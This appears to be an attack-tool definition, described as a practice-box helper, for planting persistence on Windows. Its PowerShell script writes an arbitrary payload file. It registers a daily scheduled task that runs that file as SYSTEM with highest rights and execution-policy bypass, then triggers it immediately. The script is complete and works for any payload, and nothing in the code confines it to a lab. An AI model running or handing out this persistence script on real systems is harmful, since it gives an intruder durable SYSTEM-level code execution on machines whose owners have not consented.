name: scheduled-task-persistence-win
description: Practice-box helper (Windows): plants a scheduled task running as SYSTEM. Writes the payload script ($PAYLOAD_PATH/$PAYLOAD_BODY) and registers task $TASK_NAME (daily at 03:10, SYSTEM, highest rights), then runs it once so the payload has executed at least once. Vars: TASK_NAME (required); PAYLOAD_PATH (required); PAYLOAD_BODY (optional). Idempotent (/F overwrites).
script:
if (-not $TASK_NAME -or -not $PAYLOAD_PATH) { throw 'TASK_NAME and PAYLOAD_PATH are required' }
$dir = Split-Path $PAYLOAD_PATH -Parent
New-Item -ItemType Directory -Force -Path $dir | Out-Null
if ($PAYLOAD_BODY) { Set-Content -Path $PAYLOAD_PATH -Value $PAYLOAD_BODY -Encoding ascii }
$action = New-ScheduledTaskAction -Execute 'powershell.exe' `
    -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$PAYLOAD_PATH`""
$principal = New-ScheduledTaskPrincipal -UserId 'S-1-5-18' -LogonType ServiceAccount -RunLevel Highest
$trigger = New-ScheduledTaskTrigger -Daily -At '03:10'
Register-ScheduledTask -TaskName $TASK_NAME -Action $action -Principal $principal -Trigger $trigger -Force | Out-Null
Start-ScheduledTask -TaskName $TASK_NAME
